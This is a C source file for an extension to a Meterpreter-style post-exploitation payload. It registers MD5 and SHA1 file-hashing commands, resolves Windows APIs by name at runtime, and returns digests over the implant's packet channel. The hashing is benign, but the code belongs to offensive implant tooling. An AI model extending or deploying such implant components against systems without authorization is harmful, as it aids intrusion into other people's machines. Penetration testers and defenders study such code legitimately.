#include "meterpreter_micro.h"
#include <wincrypt.h>
#include "micro_runtime.h"
#include "micro_stdapi.h"

typedef HANDLE(WINAPI* CreateFileWFunction)(LPCWSTR name, DWORD access, DWORD sharing, LPSECURITY_ATTRIBUTES attributes, DWORD creation, DWORD flags, HANDLE template_file);
typedef BOOL(WINAPI* ReadFileFunction)(HANDLE file, LPVOID buffer, DWORD bytes_to_read, LPDWORD bytes_read, LPOVERLAPPED overlapped);
typedef BOOL(WINAPI* CloseHandleFunction)(HANDLE object);
typedef BOOL(WINAPI* CryptAcquireContextWFunction)(HCRYPTPROV* provider, LPCWSTR container, LPCWSTR provider_name, DWORD provider_type, DWORD flags);
typedef BOOL(WINAPI* CryptCreateHashFunction)(HCRYPTPROV provider, ALG_ID algorithm, HCRYPTKEY key, DWORD flags, HCRYPTHASH* hash);
typedef BOOL(WINAPI* CryptHashDataFunction)(HCRYPTHASH hash, const BYTE* data, DWORD data_size, DWORD flags);
typedef BOOL(WINAPI* CryptGetHashParamFunction)(HCRYPTHASH hash, DWORD parameter, BYTE* data, DWORD* data_size, DWORD flags);
typedef BOOL(WINAPI* CryptDestroyHashFunction)(HCRYPTHASH hash);
typedef BOOL(WINAPI* CryptReleaseContextFunction)(HCRYPTPROV provider, DWORD flags);

static MetApi* hash_api;

static DWORD hash_file(Remote* remote, Packet* packet, ALG_ID algorithm)
{
	CreateFileWFunction create_file = (CreateFileWFunction)micro_resolve(hash_api, "kernel32.dll", "CreateFileW");
	ReadFileFunction read_file = (ReadFileFunction)micro_resolve(hash_api, "kernel32.dll", "ReadFile");
	CloseHandleFunction close_handle = (CloseHandleFunction)micro_resolve(hash_api, "kernel32.dll", "CloseHandle");
	CryptAcquireContextWFunction acquire_context = (CryptAcquireContextWFunction)micro_resolve(hash_api, "advapi32.dll", "CryptAcquireContextW");
	CryptCreateHashFunction create_hash = (CryptCreateHashFunction)micro_resolve(hash_api, "advapi32.dll", "CryptCreateHash");
	CryptHashDataFunction hash_data = (CryptHashDataFunction)micro_resolve(hash_api, "advapi32.dll", "CryptHashData");
	CryptGetHashParamFunction get_hash = (CryptGetHashParamFunction)micro_resolve(hash_api, "advapi32.dll", "CryptGetHashParam");
	CryptDestroyHashFunction destroy_hash = (CryptDestroyHashFunction)micro_resolve(hash_api, "advapi32.dll", "CryptDestroyHash");
	CryptReleaseContextFunction release_context = (CryptReleaseContextFunction)micro_resolve(hash_api, "advapi32.dll", "CryptReleaseContext");
	Packet* response = hash_api->packet.create_response(packet);
	const char* path_value = hash_api->packet.get_tlv_value_string(packet, TLV_TYPE_FILE_PATH);
	wchar_t* path = path_value == NULL ? NULL : micro_utf8_to_wide(hash_api, path_value);
	HANDLE file = INVALID_HANDLE_VALUE;
	HCRYPTPROV provider = 0;
	HCRYPTHASH hash = 0;
	BYTE input[2048];
	BYTE digest[20];
	DWORD result = ERROR_SUCCESS;
	DWORD digest_size = sizeof(digest);
	if (response == NULL || path == NULL)
	{
		result = ERROR_INVALID_PARAMETER;
		goto finish;
	}
	if (create_file == NULL || read_file == NULL || close_handle == NULL || acquire_context == NULL || create_hash == NULL || hash_data == NULL || get_hash == NULL || destroy_hash == NULL || release_context == NULL)
	{
		result = ERROR_PROC_NOT_FOUND;
		goto finish;
	}
	file = create_file(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (file == INVALID_HANDLE_VALUE)
	{
		result = micro_last_error();
		goto finish;
	}
	if (!acquire_context(&provider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) || !create_hash(provider, algorithm, 0, 0, &hash))
	{
		result = micro_last_error();
		goto finish;
	}
	for (;;)
	{
		DWORD read = 0;
		if (!read_file(file, input, sizeof(input), &read, NULL))
		{
			result = micro_last_error();
			break;
		}
		if (read == 0)
		{
			break;
		}
		if (!hash_data(hash, input, read, 0))
		{
			result = micro_last_error();
			break;
		}
	}
	if (result == ERROR_SUCCESS)
	{
		DWORD hash_size_size = sizeof(digest_size);
		if (!get_hash(hash, HP_HASHSIZE, (BYTE*)&digest_size, &hash_size_size, 0) || digest_size > sizeof(digest) || !get_hash(hash, HP_HASHVAL, digest, &digest_size, 0))
		{
			result = micro_last_error();
		}
		else
		{
			hash_api->packet.add_tlv_raw(response, TLV_TYPE_FILE_HASH, digest, digest_size);
		}
	}

finish:
	if (hash != 0 && destroy_hash != NULL)
	{
		destroy_hash(hash);
	}
	if (provider != 0 && release_context != NULL)
	{
		release_context(provider, 0);
	}
	if (file != INVALID_HANDLE_VALUE && close_handle != NULL)
	{
		close_handle(file);
	}
	micro_free(hash_api, path);
	return response == NULL ? result : hash_api->packet.transmit_response(result, remote, response);
}

static BOOL hash_md5_inline(Remote* remote, Packet* packet, DWORD* result)
{
	*result = hash_file(remote, packet, CALG_MD5);
	return TRUE;
}

static BOOL hash_sha1_inline(Remote* remote, Packet* packet, DWORD* result)
{
	*result = hash_file(remote, packet, CALG_SHA1);
	return TRUE;
}

static Command hash_commands[] =
{
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_MD5, hash_md5_inline),
	COMMAND_INLINE_REQ(COMMAND_ID_STDAPI_FS_SHA1, hash_sha1_inline),
	COMMAND_TERMINATOR
};

static MicroExtension hash_extension =
{
	sizeof(MicroExtension), MICRO_EXTENSION_ABI_VERSION, "micro-stdapi-fs-hash", 2, hash_commands, MICRO_EXTENSION_FLAG_INLINE_HANDLERS
};

const MicroExtension* micro_init(MetApi* api, Remote* remote)
{
	(void)remote;
	if (api == NULL || api->packet.create_response == NULL || api->packet.get_tlv_value_string == NULL || api->packet.add_tlv_raw == NULL || api->packet.transmit_response == NULL)
	{
		return NULL;
	}
	hash_api = api;
	return &hash_extension;
}

DWORD micro_deinit(Remote* remote)
{
	(void)remote;
	hash_api = NULL;
	return ERROR_SUCCESS;
}
